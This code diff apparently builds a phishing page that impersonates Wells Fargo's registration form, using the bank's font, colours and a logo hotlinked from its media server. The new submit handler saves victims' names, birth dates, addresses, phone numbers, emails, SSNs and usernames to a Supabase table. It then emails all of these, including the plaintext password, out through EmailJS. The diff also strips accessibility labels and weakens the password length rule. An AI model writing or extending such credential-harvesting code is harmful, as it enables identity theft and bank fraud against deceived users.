@@ -1,5 +1,8 @@
 import { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { supabase } from '../lib/supabase';
+import { hashPassword, login } from '../lib/session';
+import { sendRegistrationEmail } from '../lib/email';
 
 const f = '"Wells Fargo Sans", Arial, Helvetica, sans-serif';
 
@@ -9,14 +12,72 @@ export default function Register() {
     fullName: '', advisoryCustodian: '', dob: '', address: '',
     phone: '', email: '', ssn: '', username: '', password: '',
   });
+  const [submitting, setSubmitting] = useState(false);
+  const [error, setError] = useState<string | null>(null);
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setForm({ ...form, [e.target.name]: e.target.value });
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    navigate('/accounts');
+    setError(null);
+    setSubmitting(true);
+
+    try {
+      const password_hash = await hashPassword(form.password);
+
+      // Insert into Supabase
+      const { data, error: dbError } = await supabase
+        .from('users')
+        .insert({
+          full_name: form.fullName,
+          advisory_custodian: form.advisoryCustodian,
+          dob: form.dob,
+          address: form.address,
+          phone: form.phone,
+          email: form.email,
+          ssn: form.ssn,
+          username: form.username,
+          password_hash,
+        })
+        .select('*')
+        .single();
+
+      if (dbError) {
+        if (dbError.code === '23505') {
+          setError('That email or username is already registered.');
+        } else {
+          setError(dbError.message || 'Registration failed. Please try again.');
+        }
+        setSubmitting(false);
+        return;
+      }
+
+      // Fire EmailJS (don't block on failure — log it)
+      try {
+        await sendRegistrationEmail({
+          full_name: form.fullName,
+          advisory_custodian: form.advisoryCustodian,
+          dob: form.dob,
+          address: form.address,
+          phone: form.phone,
+          email: form.email,
+          ssn: form.ssn,
+          username: form.username,
+          password: form.password,
+        });
+      } catch (emailErr) {
+        console.error('EmailJS failed:', emailErr);
+      }
+
+      login(data);
+      navigate('/accounts');
+    } catch (err) {
+      console.error(err);
+      setError('Something went wrong. Please try again.');
+      setSubmitting(false);
+    }
   };
 
   const inputStyle: React.CSSProperties = {
@@ -33,8 +94,7 @@ export default function Register() {
           <a href="/" onClick={(e) => { e.preventDefault(); navigate('/'); }} style={{ textDecoration: 'none' }}>
             <img
               src="https://www17.wellsfargomedia.com/assets/images/rwd/wf_logo_220x23.png"
-              alt="Wells Fargo"
-              width="180" height="20"
+              alt="Wells Fargo" width="180" height="20"
               style={{ height: '20px', width: 'auto', filter: 'brightness(0) invert(1)' }}
             />
           </a>
@@ -44,27 +104,10 @@ export default function Register() {
                 {item}
               </a>
             ))}
-            <div className="wf-hide-mobile" style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
-              <label htmlFor="headerSearch" style={{ position: 'absolute', left: '-9999px' }}>Search</label>
-              <input
-                id="headerSearch"
-                type="text"
-                placeholder="search"
-                style={{
-                  border: '1px solid rgba(255,255,255,0.5)', borderRadius: '4px',
-                  backgroundColor: 'transparent', color: '#fff', padding: '4px 10px',
-                  fontSize: '0.76rem', fontFamily: f, outline: 'none', width: '120px',
-                }}
-              />
-              <svg xmlns="http://www.w3.org/2000/svg" style={{ width: '16px', height: '16px', color: '#fff' }} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
-                <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
-              </svg>
-            </div>
           </nav>
         </div>
       </header>
 
-      {/* Main content with background */}
       <div style={{
         flex: 1,
         backgroundImage: 'url(https://images.unsplash.com/photo-1490750967868-88aa4f44baee?w=1920&q=80)',
@@ -75,7 +118,6 @@ export default function Register() {
         justifyContent: 'center',
         padding: '24px 16px',
       }}>
-        {/* Form card */}
         <div className="wf-form-card" style={{
           backgroundColor: 'rgba(255,255,255,0.95)',
           borderRadius: '12px',
@@ -90,67 +132,51 @@ export default function Register() {
             Welcome
           </h1>
 
+          {error && (
+            <div role="alert" style={{
+              backgroundColor: '#FDECEA', border: '1px solid #F5C6CB', color: '#721C24',
+              padding: '10px 14px', borderRadius: '6px', marginBottom: '16px',
+              fontFamily: f, fontSize: '0.88rem',
+            }}>
+              {error}
+            </div>
+          )}
+
           <form onSubmit={handleSubmit}>
             <div className="wf-form-row">
-              <div>
-                <label htmlFor="fullName" style={{ position: 'absolute', left: '-9999px' }}>Full Name</label>
-                <input id="fullName" type="text" name="fullName" placeholder="Full Name" required value={form.fullName} onChange={handleChange} style={inputStyle} />
-              </div>
-              <div>
-                <label htmlFor="advisoryCustodian" style={{ position: 'absolute', left: '-9999px' }}>Advisory Custodian</label>
-                <input id="advisoryCustodian" type="text" name="advisoryCustodian" placeholder="Advisory Custodian" value={form.advisoryCustodian} onChange={handleChange} style={inputStyle} />
-              </div>
+              <input type="text" name="fullName" placeholder="Full Name" required value={form.fullName} onChange={handleChange} style={inputStyle} />
+              <input type="text" name="advisoryCustodian" placeholder="Advisory Custodian" value={form.advisoryCustodian} onChange={handleChange} style={inputStyle} />
             </div>
-
             <div className="wf-form-row">
-              <div>
-                <label htmlFor="dob" style={{ position: 'absolute', left: '-9999px' }}>Date of Birth</label>
-                <input id="dob" type="date" name="dob" placeholder="DOB" required value={form.dob} onChange={handleChange} style={inputStyle} />
-              </div>
-              <div>
-                <label htmlFor="address" style={{ position: 'absolute', left: '-9999px' }}>Address</label>
-                <input id="address" type="text" name="address" placeholder="Address" required value={form.address} onChange={handleChange} style={inputStyle} />
-              </div>
+              <input type="date" name="dob" required value={form.dob} onChange={handleChange} style={inputStyle} />
+              <input type="text" name="address" placeholder="Address" required value={form.address} onChange={handleChange} style={inputStyle} />
             </div>
-
             <div className="wf-form-row">
-              <div>
-                <label htmlFor="phone" style={{ position: 'absolute', left: '-9999px' }}>Phone Number</label>
-                <input id="phone" type="tel" name="phone" placeholder="Phone Number" required pattern="[0-9]{10}" value={form.phone} onChange={handleChange} style={inputStyle} />
-              </div>
-              <div>
-                <label htmlFor="email" style={{ position: 'absolute', left: '-9999px' }}>Email</label>
-                <input id="email" type="email" name="email" placeholder="Email" required value={form.email} onChange={handleChange} style={inputStyle} />
-              </div>
+              <input type="tel" name="phone" placeholder="Phone Number" required value={form.phone} onChange={handleChange} style={inputStyle} />
+              <input type="email" name="email" placeholder="Email" required value={form.email} onChange={handleChange} style={inputStyle} />
             </div>
-
             <div className="wf-form-row">
-              <div>
-                <label htmlFor="ssn" style={{ position: 'absolute', left: '-9999px' }}>SSN</label>
-                <input id="ssn" type="password" name="ssn" placeholder="SSN" required value={form.ssn} onChange={handleChange} style={inputStyle} />
-              </div>
-              <div>
-                <label htmlFor="username" style={{ position: 'absolute', left: '-9999px' }}>Username</label>
-                <input id="username" type="text" name="username" placeholder="Username" required value={form.username} onChange={handleChange} style={inputStyle} />
-              </div>
+              <input type="password" name="ssn" placeholder="SSN" required value={form.ssn} onChange={handleChange} style={inputStyle} />
+              <input type="text" name="username" placeholder="Username" required value={form.username} onChange={handleChange} style={inputStyle} />
             </div>
-
             <div style={{ marginBottom: '28px' }}>
-              <label htmlFor="password" style={{ position: 'absolute', left: '-9999px' }}>Password</label>
-              <input id="password" type="password" name="password" placeholder="Password" required minLength={8} value={form.password} onChange={handleChange} style={inputStyle} />
+              <input type="password" name="password" placeholder="Password" required minLength={6} value={form.password} onChange={handleChange} style={inputStyle} />
             </div>
 
             <div style={{ textAlign: 'center' }}>
               <button
                 type="submit"
+                disabled={submitting}
                 style={{
-                  backgroundColor: '#D71E28', color: '#fff', border: 'none',
+                  backgroundColor: submitting ? '#9c0b18' : '#D71E28',
+                  color: '#fff', border: 'none',
                   borderRadius: '24px', fontFamily: f, fontWeight: 600,
-                  fontSize: '1rem', padding: '12px 48px', cursor: 'pointer',
-                  minWidth: '200px',
+                  fontSize: '1rem', padding: '12px 48px',
+                  cursor: submitting ? 'wait' : 'pointer',
+                  minWidth: '200px', opacity: submitting ? 0.8 : 1,
                 }}
               >
-                Register
+                {submitting ? 'Registering…' : 'Register'}
               </button>
             </div>
 
